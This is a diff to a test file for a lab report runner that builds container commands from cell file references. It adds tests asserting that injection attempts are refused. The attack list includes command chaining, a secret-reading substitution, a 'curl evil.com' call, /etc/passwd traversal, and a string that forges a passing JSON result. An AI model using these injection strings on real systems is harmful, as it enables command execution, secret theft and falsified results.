@@ -56,11 +56,11 @@ describe("running a cell", () => {
 
   test("never writes build output into the read-only job tree", () => {
     for (const runtime of Object.values(RUNTIMES)) {
-      const command = runtime.cellCommand("cells/x").join(" ");
-      const writes = command.match(/-o\s+(\S+)/g) ?? [];
+      const command = runtime.cellCommand("cells/x.ext");
+      const targets = command.filter((part) => part.startsWith("/") && !part.startsWith(JOB_MOUNT));
 
-      for (const write of writes) {
-        expect(write).toContain(BUILD_MOUNT);
+      for (const target of targets) {
+        expect(target.startsWith(BUILD_MOUNT)).toBe(true);
       }
     }
   });
@@ -135,5 +135,74 @@ describe("the container a runtime asks for", () => {
     const spec = buildContainerSpec({ image: "lab-python", cmd: ["true"], jobDir: "/jobs/job_1" });
 
     expect(spec.Env).toContain(`PYTHONPATH=${JOB_MOUNT}`);
+  });
+});
+
+describe("a cell reference cannot become a command", () => {
+  const attacks = [
+    'cells/x.cpp -o /dev/null; printf "{\\"err_max\\": \\"9,99\\"}"; exit 0 #',
+    "cells/x.cpp; id > /build/pwned",
+    "cells/$(cat /job/src/secret).cpp",
+    "cells/x.cpp && curl evil.com",
+    "cells/../../etc/passwd",
+    "cells/x`whoami`.cpp",
+  ];
+
+  test("refuses a reference that is not a plain cell file", () => {
+    for (const runtime of Object.values(RUNTIMES)) {
+      for (const attack of attacks) {
+        expect(() => runtime.cellCommand(attack)).toThrow();
+      }
+    }
+  });
+
+  test("never puts a reference inside a shell word it could break out of", () => {
+    for (const runtime of Object.values(RUNTIMES)) {
+      const command = runtime.cellCommand("cells/metrics.x");
+      const script = command[0] === "sh" ? (command[2] ?? "") : "";
+
+      expect(script).not.toContain("cells/metrics.x");
+    }
+  });
+
+  test("still accepts the references a report actually uses", () => {
+    expect(() => RUNTIMES.python.cellCommand("cells/compute_errors.py")).not.toThrow();
+    expect(() => RUNTIMES.java.cellCommand("cells/Metrics.java")).not.toThrow();
+    expect(() => RUNTIMES.cpp.cellCommand("cells/plot-convergence.cpp")).not.toThrow();
+  });
+});
+
+describe("compiled runtimes build the lab's own sources", () => {
+  test("c++ compiles the sources in src alongside the cell", () => {
+    const script = RUNTIMES.cpp.cellCommand("cells/metrics.cpp")[2] ?? "";
+
+    expect(script).toContain("/job/src");
+    expect(script).toContain(".cpp");
+  });
+
+  test("java compiles the sources in src alongside the cell", () => {
+    const script = RUNTIMES.java.cellCommand("cells/Metrics.java")[2] ?? "";
+
+    expect(script).toContain("/job/src");
+    expect(script).toContain(".java");
+  });
+});
+
+describe("choosing the image", () => {
+  test("takes the image from the runtime when none is given", () => {
+    const spec = buildContainerSpec({ jobDir: "/jobs/job_1", cmd: ["true"], runtime: "java" });
+
+    expect(spec.Image).toBe(RUNTIMES.java.image);
+  });
+
+  test("still allows an explicit image for a test or a one-off", () => {
+    const spec = buildContainerSpec({
+      jobDir: "/jobs/job_1",
+      cmd: ["true"],
+      runtime: "java",
+      image: "eclipse-temurin:21-jdk-alpine",
+    });
+
+    expect(spec.Image).toBe("eclipse-temurin:21-jdk-alpine");
   });
 });
